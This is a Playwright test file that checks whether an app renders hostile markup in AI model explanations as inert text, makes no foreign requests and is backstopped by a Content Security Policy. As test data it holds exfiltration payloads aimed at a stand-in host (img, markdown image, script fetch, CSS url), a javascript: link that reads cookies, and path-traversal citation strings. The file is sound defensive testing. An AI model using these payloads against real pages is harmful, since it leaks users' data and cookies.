import { expect, test } from "@playwright/test";
import { watch } from "./support.ts";

/**
 * Threat model F-06 rendering oracle: a hostile explanation (apps/web/app/e2e/explanation)
 * renders its markup as visible text, and the page issues no request to any origin but our
 * own. Every foreign request is recorded and aborted, so the assertion is "nothing tried",
 * not "nothing arrived".
 */

const PAGE = "/e2e/explanation";

test.describe("model output rendering (F-06)", () => {
  test("injected markup is visible text and nothing leaves the origin", async ({
    page,
    baseURL,
  }) => {
    const w = await watch(page, new URL(baseURL as string).origin);
    const res = await page.goto(PAGE);
    expect(res?.status(), "fixture page needs DM_E2E_FIXTURES=1").toBe(200);
    await page.waitForLoadState("networkidle");

    const article = page.getByRole("article", { name: "Explanation" });
    await expect(article).toBeVisible();

    // The payloads appear verbatim, as characters on screen.
    for (const visible of [
      '<img src="https://exfil.invalid/p?d=aws_iam_role.admin,aws_s3_bucket.logs&via=img">',
      "![status](https://exfil.invalid/p?d=aws_iam_role.admin,aws_s3_bucket.logs&via=md-img)",
      '<script>fetch("https://exfil.invalid/p?d=aws_iam_role.admin,aws_s3_bucket.logs&via=script")</script>',
      "[open console](javascript:alert(document.cookie))",
      "<svg onload=",
      "<iframe src=",
      "<form action=",
      "<style>body{background:url(",
    ]) {
      await expect(article).toContainText(visible);
    }

    // ...and none of them became elements.
    for (const tag of ["img", "script", "svg", "iframe", "form", "style", "object", "embed"]) {
      await expect(article.locator(tag), `<${tag}> rendered from model output`).toHaveCount(0);
    }

    // The only links are internal citations into our own source viewer.
    const hrefs = await article
      .locator("a")
      .evaluateAll((as) => as.map((a) => a.getAttribute("href")));
    expect(hrefs.length).toBe(3);
    for (const href of hrefs) {
      expect(href).toMatch(/^\/source\/[0-9a-f]{7,64}\/[^:]+#L\d+-L\d+$/);
    }
    // Hostile citation paths are shown, inert.
    await expect(article).toContainText("javascript:alert(1):1");
    await expect(article).toContainText("../../../etc/passwd:1");

    await expect(article.getByRole("note")).toContainText(
      "This repository contains text addressed to an AI assistant",
    );

    expect(w.foreign, "requests to a foreign origin").toEqual([]);
    expect(await w.violations(), "CSP violations").toEqual([]);
    expect(w.consoleErrors).toEqual([]);
  });

  test("confidence is conveyed by text, not colour alone", async ({ page }) => {
    await page.goto(PAGE);
    const article = page.getByRole("article", { name: "Explanation" });
    await expect(article).toContainText("Verified");
    await expect(article).toContainText("Inferred");
    await expect(article).toContainText("General AWS knowledge");
  });

  test("the CSP blocks an exfiltration image even if the renderer regresses", async ({
    page,
    baseURL,
  }) => {
    // Simulates the F-06 failure the CSP backstops: markup reaching the DOM unescaped.
    const w = await watch(page, new URL(baseURL as string).origin);
    await page.goto(PAGE);
    await page.evaluate(() => {
      const img = document.createElement("img");
      img.src = "https://exfil.invalid/p?d=aws_s3_bucket.logs&via=regression";
      document.body.append(img);
    });
    await expect
      .poll(() => w.violations())
      .toContainEqual("img-src https://exfil.invalid/p?d=aws_s3_bucket.logs&via=regression");
    expect(w.foreign).toEqual([]);
  });
});
